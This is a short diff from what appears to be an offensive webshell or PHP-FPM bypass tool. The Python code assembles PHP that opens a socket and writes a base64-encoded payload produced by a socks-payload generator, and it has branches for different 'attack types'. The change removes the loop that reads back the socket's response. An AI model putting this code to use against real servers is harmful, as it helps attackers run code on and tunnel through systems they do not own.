@@ -1630,7 +1630,7 @@ die('stream_socket_client function not exist or sock not exist');
             } else {
                 die('fsockopen/pfsockopen function not exist');
             }"""
-            phpcode += "fputs($sock, base64_decode('%s'));while(!feof($sock)){$fpm_r.=fread($sock,4096);}" % (
+            phpcode += "fputs($sock, base64_decode('%s'));" % (
                 generate_base64_socks_payload(host, port, ext_upload_path))
         else:
             phpcode += "die('unknown attack type');"
